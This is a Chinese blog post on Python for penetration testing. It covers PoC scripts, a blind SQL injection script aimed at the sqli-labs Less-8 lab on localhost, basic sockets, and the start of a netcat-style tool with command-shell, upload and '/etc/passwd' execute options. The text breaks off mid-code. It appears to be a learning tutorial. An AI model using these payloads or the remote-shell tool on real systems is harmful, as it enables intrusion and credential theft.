<!DOCTYPE html>


<html lang="zh-CN">
  

    <head>
      <meta charset="utf-8" />
        
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title>python与渗透 |  小张之栈</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      
<link rel="stylesheet" href="/css/fonts/remixicon.css">

      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    </head>
  </html>
</html>


<body>
  <div id="app">
    
      <canvas class="fireworks"></canvas>
      <style>
        .fireworks {
          position: fixed;
          left: 0;
          top: 0;
          z-index: 99999;
          pointer-events: none;
        }
      </style>
      
      
    <main class="content on">
      <section class="outer">
  <article
  id="post-python与渗透"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
  
    
    <header class="article-header">
       
<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
  python与渗透
</h1>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/05/20/python%E4%B8%8E%E6%B8%97%E9%80%8F/" class="article-date">
  <time datetime="2023-05-20T02:11:37.000Z" itemprop="datePublished">2023-05-20</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/python/">python</a> / <a class="article-category-link" href="/categories/python/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
  </div>
  
<div class="word_count">
    <span class="post-time">
        <span class="post-meta-item-icon">
            <i class="ri-quill-pen-line"></i>
            <span class="post-meta-item-text"> 字数统计:</span>
            <span class="post-count">6.6k</span>
        </span>
    </span>

    <span class="post-time">
        &nbsp; | &nbsp;
        <span class="post-meta-item-icon">
            <i class="ri-book-open-line"></i>
            <span class="post-meta-item-text"> 阅读时长≈</span>
            <span class="post-count">32 分钟</span>
        </span>
    </span>
</div>
 
    </div>
      
    <div class="tocbot"></div>




  
    <div class="article-entry" itemprop="articleBody">
       
  <p>wingide personal 9_9.1 </p>
<h1 id="1-poc编写"><a href="#1-poc编写" class="headerlink" title="1.poc编写"></a>1.poc编写</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输入点确定</span></span><br><span class="line"><span class="comment">#构造恶意输入</span></span><br><span class="line"><span class="comment">#目标检验</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#1.url处理</span></span><br><span class="line"><span class="comment">#前缀协议的增删、结尾/的删除</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;http://&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;https://&#x27;</span>):</span><br><span class="line">        url=<span class="string">&#x27;http://&#x27;</span>+url</span><br><span class="line"></span><br><span class="line">    <span class="comment">#只获取域名部分</span></span><br><span class="line">    url_paths=url.split(<span class="string">&#x27;/&#x27;</span>) <span class="comment">#如[http, ,www.ip,path,to,file] </span></span><br><span class="line">    <span class="comment">#有空的部分是因为 http://，有两个/，第二个/分割后没有值</span></span><br><span class="line">    url_without_path=<span class="string">&#x27;/&#x27;</span>.join(url_paths[:<span class="number">3</span>])<span class="comment">#列表第0,1,2元素</span></span><br><span class="line">    <span class="comment">#删除&quot;/&quot;</span></span><br><span class="line">    <span class="keyword">if</span> url_without_path.endswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">        url_without_path=url_without_path[:-<span class="number">1</span>] <span class="comment">#开头到倒数第二个字符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> url_without_path</span><br><span class="line"><span class="comment">#2.状态码识别 导入requests库</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getcode</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response=requests.get(url)</span><br><span class="line">        <span class="keyword">return</span> response.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="comment">#3.文件读取 批量漏洞验证，即读取多个url</span></span><br><span class="line"><span class="comment">#line.strip()去除该行的首尾空白字符（包括换行符）。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfile</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            urls=[line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> file.readlines()] <span class="comment">#列表推到式 </span></span><br><span class="line">        <span class="keyword">return</span> urls</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;无法读取文件&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span>[]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#读取url列表</span></span><br><span class="line">    filename=<span class="built_in">input</span>(<span class="string">&quot;url文件名&quot;</span>)</span><br><span class="line">    urls=getfile(filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(urls)==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没呀&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        process_url=process_url(url)<span class="comment">#处理成域名</span></span><br><span class="line">        status_code=getcode(process_url)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\n<span class="subst">&#123;process_url&#125;</span>\n状态码:<span class="subst">&#123;status_code&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>response方法</strong></p>
<table>
<thead>
<tr>
<th>response.status_code</th>
<th>相应的状态码</th>
</tr>
</thead>
<tbody><tr>
<td>response.json()</td>
<td>响应体的特殊字段</td>
</tr>
<tr>
<td>response.text</td>
<td>响应体里的文本内容</td>
</tr>
<tr>
<td>response.headers</td>
<td>响应头字段</td>
</tr>
<tr>
<td>response.elapsed</td>
<td>响应包的响应时间</td>
</tr>
<tr>
<td>response.content</td>
<td>响应体的二进制数据</td>
</tr>
</tbody></table>
<h2 id="poc验证"><a href="#poc验证" class="headerlink" title="poc验证"></a>poc验证</h2><h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#4.poc post验证 如果是sql注入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc_post</span>(<span class="params">target</span>):</span><br><span class="line">    url=target+<span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="comment">#参数</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;123&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#头部</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">          <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response=requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;漏洞存在&quot;</span>)</span><br><span class="line">            <span class="comment">#可进一步处理漏洞</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;无漏洞&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请求异常:&quot;</span>,e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>data改为params即可</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>以sqli-labs less 8为例</p>
<p>二分查找当然更好</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://localhost:81/sqli/Less-8/?id=&quot;</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line">name=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#substr从1开始</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">10</span>:</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>,<span class="number">128</span>):    </span><br><span class="line">       <span class="comment"># id=f&quot;1&#x27; and ascii(substr(database(),&#123;i&#125;,1))=&#123;j&#125;--+&quot;</span></span><br><span class="line">        <span class="built_in">id</span>=<span class="string">f&quot;1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">        target=url+<span class="built_in">id</span></span><br><span class="line">        response=requests.get(target)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            name=name+<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h1 id="2-socket模块"><a href="#2-socket模块" class="headerlink" title="2.socket模块"></a>2.socket模块</h1><p>客户端、服务端，TCP代理的编写；然后完善成自己的netcat，最后完成一个命令行shell工具编写。为了后续编写主机发现工具，实现跨平台嗅探、创建木马框架。</p>
<h2 id="1-基本的tcp-c-x2F-s"><a href="#1-基本的tcp-c-x2F-s" class="headerlink" title="1.基本的tcp c&#x2F;s"></a>1.基本的tcp c&#x2F;s</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">target_host=<span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line">target_port=<span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket对象的建立</span></span><br><span class="line">client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#客户端连接</span></span><br><span class="line">client.connect((target_host,target_port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line">client.send(<span class="string">b&quot;GET / HTTP/1.1\r\nHost:baidu.com\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收数据</span></span><br><span class="line">response=client.recv(<span class="number">4096</span>)<span class="comment">#只从服务端接收4096字节的数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>AF_INET</strong> 表明用ipv4地址或主机名</p>
<p><strong>SOCK_STREAM</strong>指明TCP客户端</p>
<p>客户端连接到服务器，发送数据</p>
<p>接收数据并将响应数据打印。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230623224709461.png"></p>
<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">bind_ip=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">bind_port=<span class="number">9999</span></span><br><span class="line"></span><br><span class="line">server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#监听的ip地址和端口</span></span><br><span class="line">server.bind((bind_ip,bind_port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动监听</span></span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Listening on %s:%d&quot;</span> % (bind_ip,bind_port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#客户处理线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_client</span>(<span class="params">client_socket</span>):</span><br><span class="line">    <span class="comment">#打印出客户端发送得到内容</span></span><br><span class="line">    request=client_socket.recv(<span class="number">4096</span>)<span class="comment">#执行后，消息发给客户端</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Recived: %s&quot;</span> % request.decode())</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#返还一个数据包</span></span><br><span class="line">    client_socket.send(<span class="string">b&quot;ACK!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#等待连接。</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client,addr=server.accept()<span class="comment">#client保存套接字，远程连接细节保存到addr</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Accepted connection from: %s:%d&quot;</span> % (addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">    <span class="comment">#挂起客户端线程，处理传入数据</span></span><br><span class="line">    client_handler=threading.Thread(target=handle_client,args=(client,)) <span class="comment">#新的线程对象，将客户端套接字对象作为句柄传递</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动线程，处理客户端连接</span></span><br><span class="line">    client_handler.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>.accept()使得服务器可以接受客户端的连接请求，并返回一个用于与客户端进行通信的套接字对象和客户端的地址信息。</p>
</blockquote>
<p>配合客户端的配置(且本机关闭防火墙)</p>
<blockquote>
<p>host:127.0.0.1</p>
<p>port:9999</p>
<p>…</p>
<p>.send(b”hello\r\n”)</p>
<p>….</p>
</blockquote>
<p>先执行服务端，然后执行客户端</p>
<blockquote>
<p>[*] Listening on 0.0.0.0:9999<br>[*] Accepted connection from: 127.0.0.1:62496<br>[*] Recived: hello</p>
</blockquote>
<h2 id="2-基本的udp-c-x2F-s"><a href="#2-基本的udp-c-x2F-s" class="headerlink" title="2.基本的udp c&#x2F;s"></a>2.基本的udp c&#x2F;s</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">target_host=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">target_port=<span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket对象的建立</span></span><br><span class="line">client=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line">client.send(<span class="string">b&quot;aaabbbccc&quot;</span>,(target_host,target_port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收数据</span></span><br><span class="line">data,addr=client.recvfrom(<span class="number">4096</span>) <span class="comment">#回传的数据以及远程主机信息和端口号</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3-netcat编写"><a href="#3-netcat编写" class="headerlink" title="3.netcat编写"></a>3.netcat编写</h2><p>即监听工具，比如一般使用的nc -lvnp 1234</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys   <span class="comment">#Python解释器和运行时环境交互</span></span><br><span class="line"><span class="keyword">import</span> socket <span class="comment">#客户端与服务端连接</span></span><br><span class="line"><span class="keyword">import</span> getopt <span class="comment">#命令行选项解析模块</span></span><br><span class="line"><span class="keyword">import</span> threading <span class="comment">#多线程编程,并发执行、异步操作和线程间的协调与通信等</span></span><br><span class="line"><span class="keyword">import</span> subprocess <span class="comment">#用于创建和管理子进程的模块,执行外部命令、调用其他可执行文件，并与其进行交互和处理。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#全局变量</span></span><br><span class="line">listen =<span class="literal">False</span></span><br><span class="line">command=<span class="literal">False</span></span><br><span class="line">upload =<span class="literal">False</span></span><br><span class="line">execute=<span class="string">&quot;&quot;</span></span><br><span class="line">target =<span class="string">&quot;&quot;</span></span><br><span class="line">port   =<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">usage</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;BHP Net Tool&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: bhpnet.py -t target_host -p port&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-l --listen          -listen on [host]:[port] for incoming connections&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-e  --execute=file_to_run -execute the given file upon receiving a connection&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-c --command     -initialize a command shell&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-u --upload=destination  -upon receiving connection upload a file and write to [destination]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ep:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -c&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\&quot;cat /etc/passwd\&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;echo &#x27;abcd&#x27; | ./bhpnet.py -t 192.168.0.1 -p 5555&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:]):</span><br><span class="line">        usage()</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#2.读取命令行选项</span></span><br><span class="line">    <span class="keyword">try</span>: <span class="comment">#即常见的-h,-l,-e...由opts接收，而args是剩下的命令选项</span></span><br><span class="line">        opts,args=getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">&quot;hle:t:p:cu:&quot;</span>,</span><br><span class="line">                                [<span class="string">&quot;help&quot;</span>,<span class="string">&quot;listen&quot;</span>,<span class="string">&quot;execute&quot;</span>,<span class="string">&quot;target&quot;</span>,<span class="string">&quot;port&quot;</span>,<span class="string">&quot;command&quot;</span>,<span class="string">&quot;upload&quot;</span>])</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(err))</span><br><span class="line">        usage()</span><br><span class="line">    <span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">&quot;-h&quot;</span>,<span class="string">&quot;--help&quot;</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;--listen&quot;</span>):</span><br><span class="line">            listen=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-e&quot;</span>,<span class="string">&quot;--excute&quot;</span>):</span><br><span class="line">            execute = a         </span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;--commandshell&quot;</span>):</span><br><span class="line">            command=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--upload&quot;</span>):</span><br><span class="line">            upload_destination=a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-t&quot;</span>,<span class="string">&quot;--target&quot;</span>):</span><br><span class="line">            target=a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-p&quot;</span>,<span class="string">&quot;--port&quot;</span>):</span><br><span class="line">            port=<span class="built_in">int</span>(a)</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--upload&quot;</span>):</span><br><span class="line">            upload_destination=a            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>,<span class="string">&quot;input wrong!&quot;</span></span><br><span class="line">    <span class="comment">#3.监听或 仅从标准输入发送数据</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> <span class="built_in">len</span>(target) <span class="keyword">and</span> port &gt;<span class="number">0</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#从命令行读取内存数据</span></span><br><span class="line">        <span class="comment">#阻塞，不向标准输入发送数据时，发送ctrl -d</span></span><br><span class="line">        buffer =sys.stdin.read()</span><br><span class="line">        <span class="comment">#发送数据</span></span><br><span class="line">        client_sender(buffer)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#4.监听并上传文件、执行命令</span></span><br><span class="line">    <span class="comment">#放置一个反弹shell</span></span><br><span class="line">    <span class="comment">#取决于上面的命令行选项</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br></pre></td></tr></table></figure>

<p>在main()函数中继续添加，用来接收、处理用户数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">client_sender</span>(<span class="params">buffer</span>):</span><br><span 